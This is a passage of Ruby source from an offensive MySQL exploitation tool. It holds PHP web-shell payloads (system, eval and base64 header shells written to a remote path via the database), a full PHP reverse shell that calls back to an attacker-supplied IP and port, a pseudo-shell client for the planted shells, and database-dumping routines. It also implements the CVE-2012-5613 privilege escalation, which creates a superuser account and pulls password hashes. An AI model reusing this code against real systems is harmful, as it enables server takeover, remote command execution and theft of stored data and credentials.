                  payload="<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_FOO]));print(___);die;?>"
                when 4
                  simple_connect=4
                  payload="<?error_reporting(0);print(___);$b=strrev(\"edoced_4\".\"6esab\");($var=create_function($var,$b($_SERVER[HTTP_FOO])))?$var():0;print(___);?>"
                end
                payload_filename=randz(8) + '.php'
                break
              else
                print_line("")
                print_error("Oops, Didn't quite understand that one")
                print_error("Please Choose a Valid Option From Menu Below Next Time.....")
                print_line("")
              end
            end
          when 3
            reverse=true
            print_caution("IP: ")
            ip=gets.chomp
            print_line("")
            print_caution("Port: ")
            port=gets.chomp
            print_line("")
            payload_filename=randz(8) + '.php'
            payload = "<?php set_time_limit (0); $VERSION = \"1.0\"; $ip = '#{ip}'; $port = #{port.to_i}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\"; } }; ?>" # Pentestmonkey's PHP Reverse Shell, Many THanks!
          end
          break
        else
          print_line("")
          print_error("Oops, Didn't quite understand that one")
          print_error("Please Choose a Valid Option From Menu Below Next Time.....")
          print_line("")
        end
      end
      rpath = Readline.readline("(Remote Writable Path)>", true)
      remote_path = rpath.chomp
      file_write(remote_path, payload.mysqlhex, payload_filename)
    end
    if reverse
      revurl = Readline.readline("(URL to Trigger Reverse Shell)>", true)
      print_status("Trying to trigger reverse shell, make sure your listener is open & ready...")
      sleep(5) # Dramatic pause to give a short sec for listener prep
      http = EasyCurb.new
      rez = http.get(revurl.chomp)
      if rez[1] == 200
        print_good("200 Response Received!")
        print_good("Hopefully you caught a shell....")
      else
        print_error("Bad Response Received, not sure things went as planned. Sorry.....")
      end
    end
    if simple
      answer = Readline.readline("(Do you want to try and connect to Simple Shell (Y/N)?)>", true)
      if answer.chomp.upcase == 'Y' or answer.chomp.upcase == 'YES'
        simpleurl = Readline.readline("(URL to Shell (i.e. http://#{@host}/#{remote_path.sub('/var/www/html/', '').sub('/var/www/', '')}/#{payload_filename}))>", true)
        simple_shell(simple_connect.to_i, simpleurl.chomp)
      else
        print_status("OK, will leave it to you...")
        print_status("In case you were wondering, to connect via Curl: ")
        case simple_connect.to_i
        when 1
          print_line("SYSTEM SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_CMD_HERE>")
        when 2
          print_line("EVAL SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_BASE64_ENCODED_PHP-CMD_HERE>")
        when 3
          print_line("PASSTHRU HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_CMD_HERE>\"")
        when 4
          print_line("CREATE_FUNCTION EVAL HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_PHP-CMD_HERE>\"")
        end
      end
    end
  end

  # Assistant for connecting to shells we wrote
  def simple_shell(id, url)
    print_line("")
    prompt = "(CommanD)> "
    http = EasyCurb.new
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^exit|^quit/i
        print_line("")
        print_error("OK, exiting pseudo shell....")
        print_caution("In case you were wondering, to connect via Curl: ")
        case id
        when 1
          print_line("SYSTEM SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_CMD_HERE>")
        when 2
          print_line("EVAL SHELL:\ncurl -s http://site.com/path/2/shell.php?foo=<INSERT_BASE64_ENCODED_PHP-CMD_HERE>")
        when 3
          print_line("PASSTHRU HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_CMD_HERE>\"")
        when 4
          print_line("CREATE_FUNCTION EVAL HEADER SHELL:\ncurl -s http://site.com/path/2/shell.php -H \"FOO: <INSERT_BASE64_ENCODED_PHP-CMD_HERE>\"")
        end
        print_error("Returning to Main Menu...")
        break
      else
        case id
        when 1
          link = url + "?foo=#{cmd.space2plus}"
        when 2
          code = Base64.encode64(cmd)
          link = url + "?foo=#{code.chomp}"
        when 3
          code = Base64.encode64(cmd)
          $config['HTTP']['HTTP_HEADERS_ADD']=true
          $config['HTTP']['HTTP_HEADERS'].store('FOO', code.chomp)
          link = url
        when 4
          code = Base64.encode64(cmd)
          $config['HTTP']['HTTP_HEADERS_ADD']=true
          $config['HTTP']['HTTP_HEADERS'].store('FOO', code.chomp)
          link = url
        end
        rez = http.get(link)
        if rez[0] =~ /___(.+)/m
          res=$1.chomp
          if res != ''
            cmd_results=rez[0].split("__")[1]
            print_line("#{cmd_results.sub('_', '').chomp}") unless cmd_results.nil? or cmd_results == '_'
            print_line("") if cmd_results.nil? or cmd_results == '_'
            print_error("No Results Found in Output!") if cmd_results.nil? or cmd_results == '_'
            print_line("")
          else
            print_line("")
            print_error("No Results Found in Output!")
            print_line("")
          end
        else
          print_line("")
          print_error("No Results Found in Output!")
          print_line("")
        end
        $config['HTTP']['HTTP_HEADERS_ADD']=false
      end
    end
  end
	
  # Dump Specific Table from Available Database
  def dump_table(db, tbl, num)
    t = Time.now
    timez = t.strftime("%m.%d.%Y")
    logs = RESULTS + @host
    logdir = logs + '/dumps/'
    Dir.mkdir(logs) unless File.exists?(logs)
    Dir.mkdir(logdir) unless File.exists?(logdir)
    print_status("Attempting to dump #{db}.#{tbl}....")
    if num.to_i == 1
      system("`which mysqldump` --host=#{@host} --user=#{@user} --password=#{@pass} #{db} #{tbl} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{logdir}#{db}_#{tbl}_#{timez}.sql.gz")
      print_good("Table Dump Complete!")
      print_good("You can view it here: #{logdir}#{db}_#{tbl}_#{timez}.sql.gz")
    else
      system("`which mysqldump` --host=#{@host} --user=#{@user} --password=#{@pass} #{db} #{tbl} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{logdir}#{db}_#{tbl}_#{timez}.sql")
      print_good("Table Dump Complete!")
      print_good("You can view it here: #{logdir}#{db}_#{tbl}_#{timez}.sql")
    end
  end

  # Dump Specific Database
  def dump_database(db, num)
    t = Time.now
    timez = t.strftime("%m.%d.%Y")
    logs = RESULTS + @host
    logdir = logs + '/dumps/'
    Dir.mkdir(logs) unless File.exists?(logs)
    Dir.mkdir(logdir) unless File.exists?(logdir)
    print_status("Attempting to dump #{db}....")
    if num.to_i == 1
      system("`which mysqldump` --host=#{@host} --user=#{@user} --password=#{@pass} #{db} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{logdir}#{db}_#{timez}.sql.gz")
      print_good("Database Dump Complete!")
      print_good("You can view it here: #{logdir}#{db}_#{timez}.sql.gz")
    else
      system("`which mysqldump` --host=#{@host} --user=#{@user} --password=#{@pass} #{db} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{logdir}#{db}_#{timez}.sql")
      print_good("Database Dump Complete!")
      print_good("Dump file saved to: #{logdir}#{db}_#{timez}.sql")
    end
  end

  # Dump All Available Databases (Non-Defaults)
  def dump_all_databases(num)
    timez = t.strftime("%m.%d.%Y")
    logs = RESULTS + @host
    logdir = logs + '/dumps/'
    Dir.mkdir(logs) unless File.exists?(logs)
    Dir.mkdir(logdir) unless File.exists?(logdir)
    print_status("Attempting to dump ALL available databases....")
    query = @db_connection.query('SHOW DATABASES;')
    query.each do |x|
      # Skip default databases to avoid issues with mysqldump --all-databases in newer clients
      # While longer this helps ensure cleaner DB Dump files as well
      # MYSQLDUMP Error: Couldn't read status information for table general_log (...)
      if not x[0] =~ /^mysql$|^information_schema$|^test$|^database$/i
        print_status("Dumping '#{x[0]}'....")
        if num.to_i == 1
          system("`which mysqldump` --host=#{@host} --user=#{@user} --password=#{@pass} #{x[0]} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{logdir}#{x[0]}_#{timez}.sql.gz")
        else
          system("`which mysqldump` --host=#{@host} --user=#{@user} --password=#{@pass} #{x[0]} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{logdir}#{x[0]}_#{timez}.sql")
        end
      else
        print_caution("Skipping default database '#{x[0]}'...")
      end
    end
    print_status("Database Dumping Completed!")
    print_status("Dump file(s) saved to: #{logdir}")
    system("ls -lua #{logdir} | grep --color -E '.sql.gz|.sql'")
  end

  # Kingcope CVE-2012-5613 Linux MySQL Privilege Escalation
  def kingcope_escalation
    if @version =~ /5.0/
      print_good("Version 5.0.x Detected, Setting up payload accordingly.....")
      good=true
    elsif @version =~ /5.1/
      print_good("Version 5.1.x Detected, Setting up payload accordingly.....")
      good=true
    else
      print_error("Version does not appear to be vulnerable - only works on 5.0.x-5.1.x!")
      print_error("Sorry, but you can't use this option as a result......")
      good=false
    end
    if good
      db = Readline.readline("(Database current user has proper rights to)> ", true)
      user = Readline.readline("(New Username to create)> ", true)
      pass = Readline.readline("(Password for New User)> ", true)
      # can be 5.1.x or 5.0.x
      if @version =~ /5.0/
        @inject = "select 'TYPE=TRIGGERS' into outfile'#{@datadir}#{db.chomp}/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'#{@user}\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';"
      elsif @version =~ /5.1/
        @inject = "select 'TYPE=TRIGGERS' into outfile'#{@datadir}#{db.chomp}/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', Event_priv=\\\\\\'Y\\\\\\', Trigger_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'#{@user}\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';"
      end
      @inject2 ="SELECT 'TYPE=TRIGGERNAME\\ntrigger_table=rootme;' into outfile '#{@datadir}#{db.chomp}/atk.TRN' FIELDS ESCAPED BY ''";

      # User Confirmation & Execution of Update Query
      @db_connection.close if @db_connection
      begin
        db_connection = Mysql.connect(@host, @user, @pass, @port.to_i)
        query = db_connection.query("USE #{db.chomp};")
      rescue Mysql::Error => e
        print_error("Problem with Escalation attempt!")
        print_error("#{e}")
        @db_connection = Mysql.connect(@host, @user, @pass, @db, @port.to_i)
        return false
      end
      begin
        query = db_connection.query("DROP TABLE IF EXISTS rootme;")
        query = db_connection.query("CREATE TABLE rootme (rootme VARCHAR(256));")
        query = db_connection.query("#{@inject}")
        query = db_connection.query("#{@inject2}")
        @aaaa = "A" * 10000;
        query = db_connection.query("GRANT ALL ON #{@aaaa}.* TO 'upgrade'\@'%' identified by 'foofucked';")
      rescue Mysql::Error => e
        print_good("w00t - caused MySQL to spaz!")
        print_error("#{e}")
        sleep(3)
      end
      begin
        db_connection = Mysql.connect(@host, @user, @pass, @port.to_i)
        query = db_connection.query("USE #{db.chomp};")
        query = db_connection.query("INSERT INTO rootme VALUES('ROOTED');");
        query = db_connection.query("GRANT ALL ON #{@aaaa}.* TO 'upgrade'\@'%' identified by 'foofucked';")
      rescue Mysql::Error => e
        print_good("w00t - caused MySQL to spaz - again!")
        print_error("#{e}")
        sleep(3)
      end
      begin
        db_connection = Mysql.connect(@host, @user, @pass, @port.to_i)
        query = db_connection.query("USE #{db.chomp};")
        query = db_connection.query("CREATE USER '#{user.chomp}'\@'%' IDENTIFIED BY '#{pass.chomp}';")
        query = db_connection.query("GRANT ALL PRIVILEGES ON *.* TO '#{user.chomp}'\@'%' WITH GRANT OPTION;")
        query = db_connection.query("GRANT ALL ON #{@aaaa}.* TO 'upgrade'\@'%' identified by 'foofucked';")
      rescue Mysql::Error => e
        print_good("w00t - caused MySQL to spaz - again, last time I promise!")
        print_error("#{e}")
        sleep(3)
      end
      begin
        @db_connection = Mysql.connect(@host, user.chomp, pass.chomp, @port.to_i)
        print_good("w00t - success!")
        query = @db_connection.query('SELECT @@hostname;')
        query.each { |x| print_good("Hostname: #{x[0]}") }
        query = @db_connection.query('SELECT user();')
        query.each { |x| print_good("User: #{x[0]}") }
        query = @db_connection.query('SELECT version();')
        query.each { |x| print_good("Version: #{x[0]}") }
        get_passwords

        print_status("Running cleanup to remove 'foooooofucker' account created by exploit....")
        query = @db_connection.query('USE mysql;')
        query = @db_connection.query("DROP USER 'foooooofucker'@'%';")
        query = @db_connection.query('FLUSH PRIVILEGES;')
        print_status("All done, returning to originall connection credentials.....")
        print_status("Close and reconnect with new credentials if you want a full new session...")
      rescue Mysql::Error => e
        print_error("Epic Fail - Something Went Horribly Wrong!")
        print_error("Can't Connect with New Credentials!")
        print_error("#{e}")
        sleep(3);
      end
      db_connection.close if db_connection
      @db_connection.close if @db_connection
      @db_connection = Mysql.connect(@host, @user, @pass, @db, @port.to_i)
    end
  end

  # Executes SQL query and prints results
  def custom_sql(q)
    query = q + ';' unless q =~ /;$/
    query = @db_connection.query("#{query}")
    query.each { |x| print_line("#{x.join(',')}") } unless query.empty?
  end

  # Executes SQL query NO results
  def custom_silent_sql(q)
    begin
      query = q + ';' unless q =~ /;$/
      query = @db_connection.query("#{query}")
      return true
    rescue => e
      if e =~ /MySQL server has gone away/
        print_error("Lost MySQL Connection!")
        print_error("This is likely due to payload which is too large in size.....")
        print_error("Try compressing with UPX to shrink size down: upx 9 -qq payload.exe")
        puts "\t=> ".white + "Then try again".light_red + ".....".white
      end
      return false
    end
  end

  # Pseudo SQL Shell
  def sql_shell
    cls
    banner
    prompt = "(SQL)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^exit$|^quit$|^back$/i
        print_error("OK, Returning to Main Menu....")
        break
      else
        print_line("")
        custom_sql(cmd)
        print_line("")
      end
    end
  end
end
